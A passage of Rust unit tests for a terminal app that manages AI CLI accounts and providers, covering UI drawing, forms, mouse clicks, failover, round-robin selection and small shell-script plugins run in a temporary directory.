            "claude\tclaude\tClaude Code\nt1\ttrue\tT One\nt2\ttrue\tT Two\n",
        )
        .unwrap();
        let paths = Paths {
            fo_order: home.join("cfg/failover"),
            fo_state: home.join("state"),
            ai_accounts: home.join("accts"),
            codex_home: home.join("codex"),
            cooldown: Duration::from_secs(60),
            plugins: home.join("cfg/plugins"),
            providers,
            cla_root,
            home,
        };
        let mut a = App::with_paths(paths, vec![]);
        a.value_flags = Some(vec![]); // don't run `claude --help`
        a
    }

    #[test]
    fn draws_at_any_size_without_panicking() {
        use ratatui::{Terminal, backend::TestBackend};
        let mut a = app();
        a.rows[0].usage = Usage {
            windows: vec![
                usage::Window {
                    label: "5h".into(),
                    percent: 8,
                    resets_at: Some(1_700_000_000),
                    reset: Some("Tue 12:59".into()),
                },
                usage::Window {
                    label: "7d".into(),
                    percent: 100,
                    ..Default::default()
                },
            ],
            plan: Some("max".into()),
            saved_at: Some(1_600_000_000),
            email: Some("全角@example.com".into()),
        };
        let draw_all = |a: &App| {
            for (w, h) in [(20, 5), (30, 10), (40, 10), (120, 40)] {
                let mut t = Terminal::new(TestBackend::new(w, h)).unwrap();
                t.draw(|f| {
                    crate::ui::draw(f, a);
                })
                .unwrap();
            }
        };
        draw_all(&a);
        a.wrr = true;
        a.update = Some("9.9.9".into());
        draw_all(&a);
        a.open("t1");
        draw_all(&a);
        a.focus = Focus::Home;
        draw_all(&a);
    }

    #[test]
    fn home_hits_match_what_is_drawn_and_nothing_overlaps() {
        use ratatui::{Terminal, backend::TestBackend};
        let mut a = app();
        a.wrr = true;
        a.open("t1");
        a.focus = Focus::Home;
        // a weight wider than two digits still keeps the switch column in line
        a.rows[0].weight = 150;
        for (w, h) in [(30, 10), (80, 24), (130, 20)] {
            let mut t = Terminal::new(TestBackend::new(w, h)).unwrap();
            let mut hits = Hits::default();
            t.draw(|f| hits = crate::ui::draw(f, &a)).unwrap();
            let buf = t.backend().buffer();
            let text = |r: &Rect| -> String {
                (r.x..r.right())
                    .map(|x| buf[(x, r.y)].symbol().to_string())
                    .collect()
            };
            assert!(!hits.switches.is_empty(), "{w}x{h}");
            assert!(
                hits.switches
                    .iter()
                    .all(|(r, _)| r.x == hits.switches[0].0.x)
            );
            for (r, i) in &hits.switches {
                let on = a.rows[*i].on;
                assert_eq!(text(r), if on { " ● on  " } else { " ○ off " }, "{w}x{h}");
            }
            let mut drawn: Vec<Rect> = hits.buttons.iter().map(|(r, _)| *r).collect();
            drawn.extend(hits.tabs.iter().map(|(r, _)| *r));
            for (n, r) in drawn.iter().enumerate() {
                assert!(r.right() <= w, "{w}x{h}: {r:?} off screen");
                for o in &drawn[n + 1..] {
                    assert!(!r.intersects(*o), "{w}x{h}: {r:?} overlaps {o:?}");
                }
            }
            assert!(hits.pane.is_empty(), "home has no pane");
            // clicking `✻ home` from a tab comes back here
            let home = hits
                .buttons
                .iter()
                .find(|(_, b)| *b == Button::Home)
                .unwrap()
                .0;
            a.focus = Focus::Pane;
            click(&mut a, &hits, home.x, home.y);
            assert!(a.focus == Focus::Home);
        }
    }

    #[test]
    fn tab_status_line_shows_the_flash_message() {
        use ratatui::{Terminal, backend::TestBackend};
        let mut a = app();
        a.open("t1");
        a.say("hello there");
        let mut t = Terminal::new(TestBackend::new(80, 10)).unwrap();
        t.draw(|f| {
            crate::ui::draw(f, &a);
        })
        .unwrap();
        let buf = t.backend().buffer();
        let last: String = (0..80).map(|x| buf[(x, 9)].symbol().to_string()).collect();
        assert!(last.contains("hello there"), "{last}");
        assert!(last.contains("ctrl-\\"), "{last}");
    }

    #[test]
    fn ctrl_backslash_and_alt_0_go_home_and_back() {
        let mut a = app();
        a.open("t1");
        a.open("t2");
        a.on_key(KeyEvent::new(KeyCode::Char('1'), KeyModifiers::ALT));
        a.on_key(KeyEvent::new(KeyCode::Char('\\'), KeyModifiers::CONTROL));
        assert!(a.focus == Focus::Home && !a.in_tab());
        a.on_key(KeyEvent::new(KeyCode::Char('\\'), KeyModifiers::CONTROL));
        assert!(a.in_tab() && a.current == 0);
        a.on_key(KeyEvent::new(KeyCode::Char('0'), KeyModifiers::ALT));
        assert!(!a.in_tab());
    }

    fn key(a: &mut App, code: KeyCode) {
        a.on_key(KeyEvent::new(code, KeyModifiers::NONE));
    }

    fn typed(a: &mut App, s: &str) {
        s.chars().for_each(|c| key(a, KeyCode::Char(c)));
    }

    /// Opens the add form as "Other CLI" with name and command typed in (focus ends on Command).
    fn fill_add(a: &mut App, name: &str, command: &str) {
        key(a, KeyCode::Char('a'));
        (0..3).for_each(|_| key(a, KeyCode::Right));
        key(a, KeyCode::Tab);
        typed(a, name);
        key(a, KeyCode::Tab);
        key(a, KeyCode::Tab);
        typed(a, command);
    }

    fn save(a: &mut App) {
        a.on_key(KeyEvent::new(KeyCode::Enter, KeyModifiers::CONTROL));
    }

    fn form_error(a: &App) -> Option<String> {
        match &a.modal {
            Some(Modal::Form(f)) => f.error.clone(),
            _ => None,
        }
    }

    fn providers_text(a: &App) -> String {
        fs::read_to_string(&a.paths.providers).unwrap()
    }

    fn ids(a: &App) -> Vec<String> {
        a.rows.iter().map(|r| r.entry.id.clone()).collect()
    }

    fn select(a: &mut App, id: &str) {
        a.selected = ids(a).iter().position(|i| i == id).unwrap();
    }

    fn click(a: &mut App, hits: &Hits, x: u16, y: u16) {
        a.on_mouse(
            MouseEvent {
                kind: MouseEventKind::Down(MouseButton::Left),
                column: x,
                row: y,
                modifiers: KeyModifiers::NONE,
            },
            hits,
        );
    }

    fn r(y: u16) -> Rect {
        Rect::new(0, y, 5, 1)
    }

    #[test]
    fn add_other_cli_writes_the_providers_line() {
        let mut a = app();
        fill_add(&mut a, "x", "true");
        save(&mut a);
        assert!(a.modal.is_none());
        assert!(providers_text(&a).contains("x\ttrue\tx\n"));
        assert!(ids(&a).contains(&"x".to_string()));
    }

    #[test]
    fn add_duplicate_name_keeps_the_form_open_with_an_error() {
        let mut a = app();
        fill_add(&mut a, "t1", "true");
        save(&mut a);
        assert!(form_error(&a).unwrap().contains("already"));
        assert_eq!(providers_text(&a).matches("t1\t").count(), 1);
    }

    #[test]
    fn add_invalid_name_keeps_the_form_open_with_an_error() {
        let mut a = app();
        fill_add(&mut a, "a/b", "true");
        save(&mut a);
        assert!(form_error(&a).is_some());
        assert!(!providers_text(&a).contains("a/b"));
    }

    #[test]
    fn edit_changes_label_and_command_in_place() {
        let mut a = app();
        select(&mut a, "t1");
        key(&mut a, KeyCode::Char('e')); // focus starts on Label
        a.on_key(KeyEvent::new(KeyCode::Char('u'), KeyModifiers::CONTROL));
        typed(&mut a, "New");
        key(&mut a, KeyCode::Tab);
        a.on_key(KeyEvent::new(KeyCode::Char('u'), KeyModifiers::CONTROL));
        typed(&mut a, "false");
        save(&mut a);
        assert!(a.modal.is_none());
        let text = providers_text(&a);
        assert!(text.contains("t1\tfalse\tNew\n"), "{text}");
        let lines: Vec<_> = text.lines().collect();
        assert!(lines[1].starts_with("t1\t") && lines[2].starts_with("t2\t"));
    }

    #[test]
    fn delete_provider_leaves_the_file() {
        let mut a = app();
        select(&mut a, "t1");
        key(&mut a, KeyCode::Char('d'));
        key(&mut a, KeyCode::Char('y'));
        assert!(!providers_text(&a).contains("t1\t"));
        assert!(!ids(&a).contains(&"t1".to_string()));
    }

    #[test]
    fn delete_claude_account_removes_it_for_good() {
        let mut a = app();
        select(&mut a, "claude/w");
        key(&mut a, KeyCode::Char('d'));
        key(&mut a, KeyCode::Char('y'));
        assert!(!a.paths.cla_root.join("w").exists());
        assert_eq!(fs::read_dir(&a.paths.cla_root).unwrap().count(), 0);
        assert!(!ids(&a).contains(&"claude/w".to_string()));
    }

    #[test]
    fn delete_codex_provider_removes_its_login_folder_only() {
        let mut a = app();
        let mut p = fs::read_to_string(&a.paths.providers).unwrap();
        p.push_str("cx\tcodex\tCodex\ncx2\tcodex\tCodex 2\n");
        fs::write(&a.paths.providers, p).unwrap();
        let own = a.paths.ai_accounts.join("codex/cx2");
        fs::create_dir_all(&own).unwrap();
        fs::create_dir_all(&a.paths.codex_home).unwrap();
        a.refresh();
        select(&mut a, "cx2");
        key(&mut a, KeyCode::Char('d'));
        key(&mut a, KeyCode::Char('y'));
        assert!(!own.exists() && a.paths.codex_home.exists());
        select(&mut a, "cx");
        key(&mut a, KeyCode::Char('d'));
        key(&mut a, KeyCode::Char('y'));
        assert!(
            a.paths.codex_home.exists(),
            "the main login is never deleted"
        );
    }

    #[test]
    fn delete_declined_keeps_everything() {
        let mut a = app();
        select(&mut a, "claude/w");
        key(&mut a, KeyCode::Char('d'));
        key(&mut a, KeyCode::Char('n'));
        assert!(a.modal.is_none());
        assert!(a.paths.cla_root.join("w").exists());
        assert!(ids(&a).contains(&"claude/w".to_string()));
    }

    #[test]
    fn click_row_selects_then_opens_a_tab() {
        let mut a = app();
        let i = ids(&a).iter().position(|i| i == "t1").unwrap();
        let hits = Hits {
            rows: vec![(r(1), 0), (r(2), 1), (r(3), 2)],
            ..Hits::default()
        };
        click(&mut a, &hits, 1, 1 + i as u16);
        assert_eq!(a.selected, i);
        assert!(a.tabs.is_empty());
        click(&mut a, &hits, 1, 1 + i as u16);
        assert_eq!(a.tabs.len(), 1);
        assert_eq!(a.tabs[0].member, "t1");
        assert!(a.focus == Focus::Pane);
    }

    #[test]
    fn single_click_on_keyboard_selected_row_does_not_open() {
        let mut a = app();
        let i = ids(&a).iter().position(|i| i == "t1").unwrap();
        a.selected = i;
        let hits = Hits {
            rows: vec![(r(1), 0), (r(2), 1), (r(3), 2)],
            ..Hits::default()
        };
        click(&mut a, &hits, 1, 1 + i as u16);
        assert!(a.tabs.is_empty());
        a.last_click = Some((i, Instant::now() - Duration::from_millis(600)));
        click(&mut a, &hits, 1, 1 + i as u16);
        assert!(a.tabs.is_empty());
    }

    #[test]
    fn drag_and_release_outside_pane_stay_with_the_pane() {
        let mut a = app();
        a.open("t1");
        let hits = Hits {
            pane: Rect::new(10, 2, 20, 10),
            ..Hits::default()
        };
        let ev = |kind, column, row| MouseEvent {
            kind,
            column,
            row,
            modifiers: KeyModifiers::NONE,
        };
        a.on_mouse(ev(MouseEventKind::Down(MouseButton::Left), 12, 3), &hits);
        assert!(a.pane_drag);
        a.on_mouse(ev(MouseEventKind::Drag(MouseButton::Left), 0, 0), &hits);
        assert!(a.pane_drag);
        a.on_mouse(ev(MouseEventKind::Up(MouseButton::Left), 0, 0), &hits);
        assert!(!a.pane_drag);
    }

    #[test]
    fn delete_confirms_on_y_only() {
        let mut a = app();
        a.start_delete();
        a.modal_key(KeyEvent::new(KeyCode::Enter, KeyModifiers::NONE));
        assert!(matches!(a.modal, Some(Modal::Confirm(_))));
        a.modal_key(KeyEvent::new(KeyCode::Char('n'), KeyModifiers::NONE));
        assert!(a.modal.is_none());
    }

    #[test]
    fn switch_notice_waits_for_y() {
        let mut a = app();
        a.open("t1");
        a.tabs[0].notice = Some(Notice::Switch {
            from: "w".into(),
            to: "t2".into(),
            codex: false,
            at: None,
        });
        a.tick();
        key(&mut a, KeyCode::Enter);
        key(&mut a, KeyCode::Char('n'));
        assert!(
            matches!(a.tabs[0].notice, Some(Notice::Switch { .. })),
            "no switch by time, enter or another key"
        );
        key(&mut a, KeyCode::Char('y'));
        // failover is off here, so the yes ends the tab instead of moving it
        assert!(matches!(a.tabs[0].notice, Some(Notice::Ended { .. })));
    }

    #[test]
    fn auto_switch_moves_by_itself_on_tick() {
        let mut a = app();
        config::set_auto_switch(&a.paths, true);
        a.open("t1");
        a.tabs[0].tried = vec!["t1".into()];
        a.retry(0);
        let Some(Notice::Switch { at: Some(at), .. }) = &mut a.tabs[0].notice else {
            panic!("auto on: a countdown")
        };
        *at = Instant::now() - Duration::from_secs(1);
        a.tick();
        // failover is off here, so the switch ends the tab instead of moving it
        assert!(matches!(a.tabs[0].notice, Some(Notice::Ended { .. })));
        config::set_auto_switch(&a.paths, false);
        a.retry(0);
        assert!(matches!(
            a.tabs[0].notice,
            Some(Notice::Switch { at: None, .. })
        ));
    }

    #[test]
    fn auto_switch_off_stops_a_running_countdown() {
        let mut a = app();
        config::set_auto_switch(&a.paths, true);
        a.refresh();
        a.open("t1");
        a.tabs[0].tried = vec!["t1".into()];
        a.retry(0);
        assert!(matches!(
            a.tabs[0].notice,
            Some(Notice::Switch { at: Some(_), .. })
        ));
        a.focus = Focus::Home;
        key(&mut a, KeyCode::Char('s'));
        assert!(!a.auto_switch);
        assert!(
            matches!(a.tabs[0].notice, Some(Notice::Switch { at: None, .. })),
            "the notice drops its timer and waits for y"
        );
        key(&mut a, KeyCode::Char('s'));
        assert!(a.auto_switch);
        assert!(
            matches!(a.tabs[0].notice, Some(Notice::Switch { at: None, .. })),
            "turning it on leaves a waiting y/N as is"
        );
    }

    #[test]
    fn click_switch_pill_toggles_auto_switch() {
        let mut a = app();
        let hits = Hits {
            buttons: vec![(r(5), Button::AutoSwitch)],
            ..Hits::default()
        };
        assert!(!a.auto_switch);
        click(&mut a, &hits, 1, 5);
        assert!(a.auto_switch && config::auto_switch_on(&a.paths));
        click(&mut a, &hits, 1, 5);
        assert!(!a.auto_switch && !config::auto_switch_on(&a.paths));
    }

    #[test]
    fn switch_to_codex_is_flagged() {
        let mut a = app();
        let mut p = fs::read_to_string(&a.paths.providers).unwrap();
        p.push_str("cx\tcodex\tCodex\n");
        fs::write(&a.paths.providers, p).unwrap();
        a.refresh();
        config::set_auto_switch(&a.paths, true);
        a.open("t1");
        a.tabs[0].tried = vec!["claude/w".into(), "t1".into(), "t2".into()];
        a.retry(0);
        assert!(
            matches!(
                &a.tabs[0].notice,
                Some(Notice::Switch { to, codex: true, at: Some(_), .. }) if to == "cx"
            ),
            "with auto-switch on, codex counts down too (the notice keeps the OpenAI line)"
        );
    }

    #[test]
    fn base_config_ignores_a_cla_account_folder() {
        let a = app();
        let acct = a.paths.cla_root.join("w").into_os_string();
        assert_eq!(base_config(Some(acct), &a.paths), None);
        assert_eq!(base_config(Some("".into()), &a.paths), None);
        let own = a.paths.home.join("own");
        fs::create_dir_all(&own).unwrap();
        assert_eq!(
            base_config(Some(own.clone().into_os_string()), &a.paths),
            Some(own)
        );
    }

    #[test]
    fn click_tab_switches_and_close_closes() {
        let mut a = app();
        a.open("t1");
        a.open("t2");
        assert_eq!(a.current, 1);
        let hits = Hits {
            tabs: vec![(r(0), 0), (Rect::new(10, 0, 5, 1), 1)],
            closes: vec![(Rect::new(6, 0, 1, 1), 0), (Rect::new(16, 0, 1, 1), 1)],
            ..Hits::default()
        };
        click(&mut a, &hits, 1, 0);
        assert_eq!(a.current, 0);
        click(&mut a, &hits, 16, 0);
        assert_eq!(a.tabs.len(), 1);
        assert_eq!(a.tabs[0].member, "t1");
    }

    #[test]
    fn click_failover_button_toggles_it() {
        let mut a = app();
        let hits = Hits {
            buttons: vec![(r(5), Button::Failover)],
            ..Hits::default()
        };
        assert!(!a.failover);
        click(&mut a, &hits, 1, 5);
        assert!(a.failover);
        click(&mut a, &hits, 1, 5);
        assert!(!a.failover);
    }

    #[test]
    fn click_account_switch_turns_it_off_and_on() {
        let mut a = app();
        let i = a.rows.iter().position(|r| r.priority.is_some()).unwrap();
        let id = a.rows[i].entry.id.clone();
        let hits = Hits {
            switches: vec![(r(3), i)],
            ..Hits::default()
        };
        assert!(a.rows[i].on);
        click(&mut a, &hits, 1, 3);
        let row = a.rows.iter().find(|r| r.entry.id == id).unwrap();
        assert!(!row.on, "one click turns it off");
        assert!(a.tabs.is_empty(), "the switch never opens the account");
        click(&mut a, &hits, 1, 3);
        assert!(a.rows.iter().find(|r| r.entry.id == id).unwrap().on);
    }

    #[test]
    fn click_form_field_focuses_and_save_saves() {
        let mut a = app();
        fill_add(&mut a, "x", "true");
        let hits = Hits {
            fields: (0..5).map(|i| (r(i as u16), i)).collect(),
            ..Hits::default()
        };
        click(&mut a, &hits, 1, 1);
        let Some(Modal::Form(f)) = &a.modal else {
            panic!("form closed")
        };
        assert_eq!(f.focus, 1);
        click(&mut a, &hits, 1, 4); // Save
        assert!(a.modal.is_none());
        assert!(providers_text(&a).contains("x\ttrue\tx\n"));
    }

    /// `app()` plus claude accounts `x` and `y` (members: w, x, y in that order).
    fn wrr_app() -> App {
        let a = app();
        for n in ["x", "y"] {
            fs::create_dir_all(a.paths.cla_root.join(n)).unwrap();
        }
        // `true` instead of claude: Auto opens tabs, and tests must not start the real CLI
        fs::write(&a.paths.providers, "claude\ttrue\tClaude Code\n").unwrap();
        let mut a = App::with_paths(a.paths.clone(), vec![]);
        a.value_flags = Some(vec![]);
        a
    }

    #[test]
    fn wrr_keys_and_candidates_skip_off_limited_and_zero_weight() {
        let mut a = wrr_app();
        key(&mut a, KeyCode::Char('w'));
        assert!(a.wrr);
        select(&mut a, "claude/w");
        key(&mut a, KeyCode::Char('+'));
        key(&mut a, KeyCode::Char('+'));
        assert_eq!(config::weights(&a.paths), vec![("claude/w".into(), 3)]);
        select(&mut a, "claude/x");
        key(&mut a, KeyCode::Char('-'));
        key(&mut a, KeyCode::Char('-'));
        assert_eq!(a.rows[a.selected].weight, 0, "never below 0");
        assert_eq!(
            a.auto_candidates(),
            vec![("claude/w".into(), 3), ("claude/y".into(), 1)]
        );
        config::mark_limited(&a.paths, "claude/w");
        a.toggle_member("claude/y");
        assert!(a.auto_candidates().is_empty());
        a.open_auto();
        assert!(a.tabs.is_empty());
        let order = fs::read_to_string(&a.paths.fo_order).unwrap();
        assert!(order.lines().all(|l| l.split('\t').count() == 2), "{order}");
    }

    #[test]
    fn auto_opens_by_round_robin_and_keeps_state() {
        let mut a = wrr_app();
        a.open_auto();
        assert!(a.tabs.is_empty(), "failover mode: Auto does nothing");
        config::set_wrr(&a.paths, true);
        config::save_weight(&a.paths, "claude/x", 0);
        a.refresh();
        for _ in 0..3 {
            a.open_auto();
        }
        let opened: Vec<_> = a.tabs.iter().map(|t| t.member.as_str()).collect();
        assert_eq!(opened, ["claude/w", "claude/y", "claude/w"]);
        // a restart continues the rotation
        let mut b = App::with_paths(a.paths.clone(), vec![]);
        b.value_flags = Some(vec![]);
        b.open_auto();
        assert_eq!(b.tabs[0].member, "claude/y");
    }

    #[test]
    fn model_reply_picks_or_falls_back_to_round_robin() {
        let mut a = wrr_app();
        config::set_wrr(&a.paths, true);
        a.refresh();
        let cands = a.auto_candidates();
        for (reply, want) in [
            (Some("claude/y\n"), "claude/y"),
            (Some("no idea"), "claude/w"),
            (None, "claude/w"),
        ] {
            let (tx, rx) = std::sync::mpsc::channel();
            tx.send(reply.map(str::to_string)).unwrap();
            a.deciding = Some(Deciding {
                rx,
                cands: cands.clone(),
                default: "claude/w".into(),
            });
            a.tick();
            assert!(a.deciding.is_none());
            assert_eq!(a.tabs.last().unwrap().member, want);
        }
        // a thread that died without answering counts as no answer
        let (tx, rx) = std::sync::mpsc::channel::<Option<String>>();
        drop(tx);
        a.deciding = Some(Deciding {
            rx,
            cands,
            default: "claude/x".into(),
        });
        a.tick();
        assert_eq!(a.tabs.last().unwrap().member, "claude/x");
    }

    #[test]
    fn model_form_saves_and_clears_the_model() {
        let mut a = app();
        key(&mut a, KeyCode::Char('m'));
        typed(&mut a, "haiku");
        save(&mut a);
        assert_eq!(config::model(&a.paths), "haiku");
        key(&mut a, KeyCode::Char('m'));
        a.on_key(KeyEvent::new(KeyCode::Char('u'), KeyModifiers::CONTROL));
        save(&mut a);
        assert!(config::model(&a.paths).is_empty());
    }

    #[test]
    fn alt_keys_switch_tabs_from_the_pane() {
        let mut a = app();
        a.open("t1");
        a.open("t2");
        let alt = |a: &mut App, code| a.on_key(KeyEvent::new(code, KeyModifiers::ALT));
        a.focus = Focus::Pane;
        alt(&mut a, KeyCode::Char('1'));
        assert_eq!(a.current, 0);
        alt(&mut a, KeyCode::Char('2'));
        assert_eq!(a.current, 1);
        alt(&mut a, KeyCode::Left); // goes to the CLI as a word jump
        alt(&mut a, KeyCode::Right);
        assert_eq!(a.current, 1);
        assert!(a.focus == Focus::Pane);
    }

    #[test]
    fn star_sets_and_clears_the_default_and_start_opens_it() {
        let mut a = app();
        select(&mut a, "t1");
        key(&mut a, KeyCode::Char('*'));
        assert_eq!(config::default_id(&a.paths), "t1");
        assert_eq!(a.default, "t1");
        a.open_default();
        assert_eq!(a.tabs.len(), 1);
        assert_eq!(a.tabs[0].member, "t1");
        a.focus = Focus::Home;
        key(&mut a, KeyCode::Char('*'));
        assert!(config::default_id(&a.paths).is_empty());
        config::set_default(&a.paths, "gone");
        a.refresh();
        a.open_default();
        assert_eq!(
            a.tabs.len(),
            1,
            "a default that no longer exists opens nothing"
        );
    }

    /// A plugin folder `<plugins>/<name>` whose `plugin` is this shell script.
    #[cfg(unix)]
    fn plugin_script(a: &App, name: &str, body: &str) -> PathBuf {
        use std::os::unix::fs::PermissionsExt;
        let d = a.paths.plugins.join(name);
        fs::create_dir_all(&d).unwrap();
        let p = d.join("plugin");
        fs::write(&p, format!("#!/bin/sh\n{body}\n")).unwrap();
        fs::set_permissions(&p, fs::Permissions::from_mode(0o755)).unwrap();
        plugins::tests::warm(&p);
        d
    }

    const GOOD: &str = r#"case "$1" in
rows) printf 'section\tGOOD\na\tAlpha\tready\n  \tdetail one\nb\tBeta\t\n' ;;
actions) printf 'start\tstart it\n' ;;
do) echo working; echo "started $2" ;;
launch) echo "launched $2 $3"; sleep 1 ;;
esac"#;

    /// Ticks until `done` holds (5 s at most): plugin results arrive on threads.
    fn settle(a: &mut App, done: impl Fn(&App) -> bool) {
        let end = Instant::now() + Duration::from_secs(5);
        while !done(a) && Instant::now() < end {
            a.tick();
            std::thread::sleep(Duration::from_millis(20));
        }
    }

    fn label_of(a: &App, id: &str) -> String {
        a.rows
            .iter()
            .find(|r| r.entry.id == id)
            .map(|r| r.entry.label.clone())
            .unwrap_or_default()
    }

    /// `app()` plus plugins: `good`, `bad` (fails), `slow` (hangs), `offp` (off; marks if run).
    #[cfg(unix)]
    fn plugin_app() -> App {
        let a = app();
        plugin_script(&a, "good", GOOD);
        plugin_script(&a, "bad", "exit 1");
        plugin_script(&a, "slow", "[ \"$1\" = warm ] || sleep 30");
        let off = plugin_script(
            &a,
            "offp",
            "[ \"$1\" = warm ] || touch \"$AI_PLUGIN_DIR/ran\"",
        );
        fs::write(off.join(".off"), "").unwrap();
        // past the first run, so `slow` fails on the short timeout
        let mut a = a;
        a.refresh();
        for s in &mut a.plugins {
            s.ran = true;
        }
        a.reload_plugins();
        a
    }

    #[cfg(unix)]
    #[test]
    fn a_plugins_first_rows_get_the_long_timeout_later_ones_the_short() {
        let mut a = app();
        plugin_script(
            &a,
            "late",
            "[ \"$1\" = rows ] && sleep 3 && printf 'x\\tX\\n'; true",
        );
        a.refresh();
        a.reload_plugins();
        settle(&mut a, |a| a.plugins.iter().all(|p| !p.loading));
        assert_eq!(label_of(&a, "plugin:late/x"), "X", "first run waits");
        a.reload_plugins();
        settle(&mut a, |a| a.plugins.iter().all(|p| !p.loading));
        assert!(
            matches!(a.plugins[0].rows, Some(Some(_))),
            "a later timeout keeps the last good rows"
        );
        let t = Instant::now();
        // a later run is cut at 2 s: reload and time it
        a.reload_plugins();
        settle(&mut a, |a| a.plugins.iter().all(|p| !p.loading));
        assert!(
            t.elapsed() < Duration::from_millis(2900),
            "{:?}",
            t.elapsed()
        );
    }

    #[cfg(unix)]
    #[test]
    fn edit_and_delete_buttons_on_a_plugin_row_never_touch_the_providers_file() {
        let mut a = plugin_app();
        settle(&mut a, |a| ids(a).contains(&"plugin:good/a".to_string()));
        let before = fs::read_to_string(&a.paths.providers).unwrap();
        let hits = Hits {
            buttons: vec![(r(5), Button::Edit), (r(6), Button::Delete)],
            ..Hits::default()
        };
        select(&mut a, "plugin:good/a");
        click(&mut a, &hits, 1, 5);
        assert!(a.modal.is_none(), "no edit form for a plugin");
        assert!(
            a.flash
                .as_ref()
                .is_some_and(|(m, _)| m.contains("its folder")),
            "{:?}",
            a.flash
        );
        select(&mut a, "plugin:good/a");
        click(&mut a, &hits, 1, 6);
        let Some(Modal::Confirm(c)) = &a.modal else {
            panic!("no confirm")
        };
        assert_eq!(c.id, "plugin:good");
        key(&mut a, KeyCode::Char('y'));
        assert!(!a.paths.plugins.join("good").exists());
        assert_eq!(fs::read_to_string(&a.paths.providers).unwrap(), before);
        // even a saved edit form never writes a plugin id
        let f = Form::edit("plugin:x/y", "L", "true", false);
        assert!(a.save_form(&f).is_err());
        assert_eq!(fs::read_to_string(&a.paths.providers).unwrap(), before);
    }

    #[cfg(unix)]
    #[test]
    fn plugin_sections_load_in_the_background_and_stay_out_of_failover() {
        let mut a = plugin_app();
        // the rows threads started inside plugin_app, after its (untimed) script warm-up
        let t = Instant::now();
        assert_eq!(label_of(&a, "plugin:good"), "loading…", "home never waits");
        settle(&mut a, |a| a.plugins.iter().all(|p| !p.loading));
        assert!(t.elapsed() < Duration::from_secs(4), "{:?}", t.elapsed());
        let plugin_ids: Vec<String> = ids(&a)
            .into_iter()
            .filter(|i| i.starts_with("plugin:"))
            .collect();
        assert_eq!(
            plugin_ids,
            [
                "plugin:bad",
                "plugin:good/a",
                "plugin:good/b",
                "plugin:offp",
                "plugin:slow"
            ]
        );
        assert_eq!(label_of(&a, "plugin:bad"), "bad: plugin failed");
        assert_eq!(label_of(&a, "plugin:slow"), "slow: plugin failed");
        assert_eq!(label_of(&a, "plugin:offp"), "offp · off");
        assert!(
            !a.paths.plugins.join("offp/ran").exists(),
            "an off plugin never runs"
        );
        let row = a
            .rows
            .iter()
            .find(|r| r.entry.id == "plugin:good/a")
            .unwrap();
        assert_eq!(
            (row.status.as_str(), row.details.clone()),
            ("ready", vec!["detail one".to_string()])
        );
        assert!(row.priority.is_none());
        let good = a.plugins.iter().find(|p| p.plugin.name == "good").unwrap();
        assert_eq!(good.title(), "GOOD");
        assert_eq!(
            good.actions,
            [("start".to_string(), "start it".to_string())]
        );
        // failover, round-robin and the order file never see a plugin
        for (id, _) in config::order(&a.paths, &a.entries()) {
            assert!(!id.starts_with("plugin:"), "{id}");
        }
        a.wrr = true;
        assert!(
            a.auto_candidates()
                .iter()
                .all(|(m, _)| !m.starts_with("plugin:"))
        );
        select(&mut a, "plugin:good/a");
        key(&mut a, KeyCode::Char(' '));
        assert!(
            !fs::read_to_string(&a.paths.fo_order)
                .unwrap_or_default()
                .contains("plugin:")
        );
        // a failed refresh keeps the last good rows
        plugin_script(&a, "good", "exit 1");
        a.reload_plugins();
        settle(&mut a, |a| a.plugins.iter().all(|p| !p.loading));
        assert_eq!(label_of(&a, "plugin:good/a"), "Alpha");
    }

    #[cfg(unix)]
    #[test]
    fn plugin_entry_opens_its_own_tab_and_the_default_resolves_only_when_on() {
        let mut a = plugin_app();
        settle(&mut a, |a| ids(a).contains(&"plugin:good/a".to_string()));
        select(&mut a, "plugin:good/a");
        key(&mut a, KeyCode::Enter);
        assert_eq!(a.tabs.len(), 1);
        assert_eq!(a.tabs[0].member, "plugin:good/a");
        assert!(a.tabs[0].notice.is_none());
        let screen = |a: &App| {
            a.tabs[0].pane.as_ref().map_or(String::new(), |p| {
                p.screen.lock().unwrap().screen().contents()
            })
        };
        settle(&mut a, |a| screen(a).contains("launched a"));
        assert!(screen(&a).contains("launched a"), "{}", screen(&a));
        assert!(!a.tabs[0].handoff.exists(), "no handoff for a plugin tab");

        // the state line of a section opens nothing
        a.focus = Focus::Home;
        select(&mut a, "plugin:bad");
        key(&mut a, KeyCode::Enter);
        assert_eq!(a.tabs.len(), 1);

        config::set_default(&a.paths, "plugin:good/a");
        let mut b = App::with_paths(a.paths.clone(), vec![]);
        b.open_default();
        assert_eq!(b.tabs.len(), 1, "opens before the plugin's rows loaded");
        assert_eq!(b.tabs[0].member, "plugin:good/a");
        plugins::set_on(&a.paths, "good", false).unwrap();
        for d in ["plugin:good/a", "plugin:gone/a", "plugin:good"] {
            config::set_default(&a.paths, d);
            let mut b = App::with_paths(a.paths.clone(), vec![]);
            b.open_default();
            assert!(b.tabs.is_empty(), "{d}");
        }
    }

    #[cfg(unix)]
    #[test]
    fn o_and_the_pill_toggle_a_plugin_and_d_deletes_it() {
        let mut a = plugin_app();
        settle(&mut a, |a| ids(a).contains(&"plugin:good/a".to_string()));
        select(&mut a, "plugin:good/a");
        key(&mut a, KeyCode::Char('o'));
        assert!(a.paths.plugins.join("good/.off").exists());
        assert_eq!(label_of(&a, "plugin:good"), "good · off");
        select(&mut a, "plugin:good");
        key(&mut a, KeyCode::Char('o'));
        assert!(!a.paths.plugins.join("good/.off").exists());
        let hits = Hits {
            plugins: vec![(r(2), "good".into())],
            ..Hits::default()
        };
        click(&mut a, &hits, 1, 2);
        assert!(a.paths.plugins.join("good/.off").exists());
        click(&mut a, &hits, 1, 2);
        assert!(!a.paths.plugins.join("good/.off").exists());

        select(&mut a, "plugin:bad");
        key(&mut a, KeyCode::Char('d'));
        assert!(matches!(a.modal, Some(Modal::Confirm(_))));
        key(&mut a, KeyCode::Char('n'));
        assert!(a.paths.plugins.join("bad").exists());
        key(&mut a, KeyCode::Char('d'));
        key(&mut a, KeyCode::Char('y'));
        assert!(!a.paths.plugins.join("bad").exists());
        assert!(!ids(&a).contains(&"plugin:bad".to_string()));
    }

    #[cfg(unix)]
    #[test]
    fn a_runs_a_plugin_action_and_flashes_its_last_line() {
        let mut a = plugin_app();
        settle(&mut a, |a| {
            a.plugins
                .iter()
                .any(|p| p.plugin.name == "good" && !p.actions.is_empty())
        });
        select(&mut a, "plugin:good/a");
        key(&mut a, KeyCode::Char('a'));
        let Some(Modal::Form(f)) = &a.modal else {
            panic!("no action menu")
        };
        assert_eq!(f.get("Action"), "start it");
        key(&mut a, KeyCode::Enter);
        key(&mut a, KeyCode::Enter);
